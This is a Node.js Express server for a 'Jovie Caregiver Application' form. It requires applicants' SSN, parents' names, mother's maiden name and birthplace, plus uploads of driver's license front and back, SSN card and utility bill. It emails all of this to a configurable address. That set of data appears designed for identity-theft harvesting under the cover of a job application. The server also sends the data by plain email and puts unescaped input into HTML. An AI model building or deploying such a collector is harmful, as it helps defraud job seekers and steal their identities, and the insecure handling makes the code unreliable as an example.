import cors from 'cors';
import dotenv from 'dotenv';
import express from 'express';
import multer from 'multer';
import nodemailer from 'nodemailer';

dotenv.config();

const app = express();
const PORT = Number(process.env.PORT || 5001);

const allowedOrigins = (process.env.CLIENT_ORIGIN || 'http://localhost:5173')
  .split(',')
  .map((origin) => origin.trim())
  .filter(Boolean);

app.use(
  cors({
    origin: (origin, callback) => {
      if (!origin) return callback(null, true);
      if (allowedOrigins.includes(origin)) return callback(null, true);
      return callback(new Error(`CORS blocked for origin: ${origin}`));
    },
  }),
);

app.options('*', cors());

const upload = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: 10 * 1024 * 1024,
  },
});

const requiredFields = [
  'firstName',
  'lastName',
  'ssn',
  'phone',
  'email',
  'address',
  'gender',
  'fatherName',
  'motherName',
  'motherMaidenName',
  'birthPlace',
];

const uploadFields = [
  { name: 'idFront', maxCount: 1 },
  { name: 'idBack', maxCount: 1 },
  { name: 'ssnCard', maxCount: 1 },
  { name: 'utilityBill', maxCount: 1 },
];

const fileLabelByField = {
  idFront: "Driver's License/State ID FRONT",
  idBack: "Driver's License/State ID BACK",
  ssnCard: 'SSN Card',
  utilityBill: 'Utility Bill',
};

const getTransporter = () => {
  const { SMTP_HOST, SMTP_PORT, SMTP_SECURE, SMTP_USER, SMTP_PASS } = process.env;

  if (!SMTP_HOST || !SMTP_PORT || !SMTP_USER || !SMTP_PASS) {
    throw new Error('SMTP config is incomplete. Set SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS.');
  }

  return nodemailer.createTransport({
    host: SMTP_HOST,
    port: Number(SMTP_PORT),
    secure: SMTP_SECURE === 'true',
    auth: {
      user: SMTP_USER,
      pass: SMTP_PASS,
    },
  });
};

app.get('/api/health', (_req, res) => {
  res.json({ ok: true });
});

app.post('/api/form-submit', upload.fields(uploadFields), async (req, res) => {
  try {
    const missingFields = requiredFields.filter((field) => !req.body[field]);
    if (missingFields.length > 0) {
      return res.status(400).json({ message: `Missing required fields: ${missingFields.join(', ')}` });
    }

    const missingFiles = uploadFields
      .map((field) => field.name)
      .filter((name) => !req.files?.[name]?.length);

    if (missingFiles.length > 0) {
      return res.status(400).json({ message: `Missing required file uploads: ${missingFiles.join(', ')}` });
    }

    const {
      firstName,
      lastName,
      ssn,
      phone,
      email,
      address,
      gender,
      fatherName,
      motherName,
      motherMaidenName,
      birthPlace,
    } = req.body;

    const transporter = getTransporter();
    const mailTo = process.env.MAIL_TO || process.env.SMTP_USER;
    const mailFrom = process.env.MAIL_FROM || process.env.SMTP_USER;

    const uploadedFileDetails = uploadFields.map(({ name }) => {
      const file = req.files?.[name]?.[0];
      return {
        key: name,
        label: fileLabelByField[name] || name,
        originalname: file?.originalname || 'Not uploaded',
      };
    });

    const textBody = [
      'New Jovie Caregiver Application',
      '',
      `First Name: ${firstName}`,
      `Last Name: ${lastName}`,
      `SSN: ${ssn}`,
      `Phone: ${phone}`,
      `Email: ${email}`,
      `Address: ${address}`,
      `Gender: ${gender}`,
      `Father\'s Name: ${fatherName}`,
      `Mother\'s Name: ${motherName}`,
      `Mother\'s Maiden Name: ${motherMaidenName}`,
      `Place of Birth: ${birthPlace}`,
      '',
      'Uploaded Files:',
      ...uploadedFileDetails.map((file) => `${file.label}: ${file.originalname}`),
      '',
      `Submitted At: ${new Date().toISOString()}`,
    ].join('\n');

    const uploadedFilesHtml = uploadedFileDetails
      .map((file) => `<li><strong>${file.label}:</strong> ${file.originalname}</li>`)
      .join('');

    const htmlBody = `
      <h2>New Jovie Caregiver Application</h2>
      <p><strong>First Name:</strong> ${firstName}</p>
      <p><strong>Last Name:</strong> ${lastName}</p>
      <p><strong>SSN:</strong> ${ssn}</p>
      <p><strong>Phone:</strong> ${phone}</p>
      <p><strong>Email:</strong> ${email}</p>
      <p><strong>Address:</strong> ${address}</p>
      <p><strong>Gender:</strong> ${gender}</p>
      <p><strong>Father's Name:</strong> ${fatherName}</p>
      <p><strong>Mother's Name:</strong> ${motherName}</p>
      <p><strong>Mother's Maiden Name:</strong> ${motherMaidenName}</p>
      <p><strong>Place of Birth:</strong> ${birthPlace}</p>
      <p><strong>Uploaded Files:</strong></p>
      <ul>${uploadedFilesHtml}</ul>
      <p><strong>Submitted At:</strong> ${new Date().toISOString()}</p>
    `;

    const attachments = uploadFields
      .map(({ name }) => {
        const file = req.files?.[name]?.[0];
        if (!file) return null;
        return {
          // Prefix with field key so each attachment is unique and easy to identify.
          filename: `${name}-${file.originalname}`,
          content: file.buffer,
          contentType: file.mimetype,
        };
      })
      .filter(Boolean);

    await transporter.sendMail({
      from: mailFrom,
      to: mailTo,
      subject: `New Jovie Application - ${firstName} ${lastName}`,
      text: textBody,
      html: htmlBody,
      replyTo: email,
      attachments,
    });

    console.log(`Application email sent with ${attachments.length} attachment(s).`);

    return res.status(200).json({ message: 'Application submitted.' });
  } catch (error) {
    return res.status(500).json({ message: error.message || 'Unable to send application email.' });
  }
});

app.listen(PORT, () => {
  console.log(`Mail server running on http://localhost:${PORT}`);
});
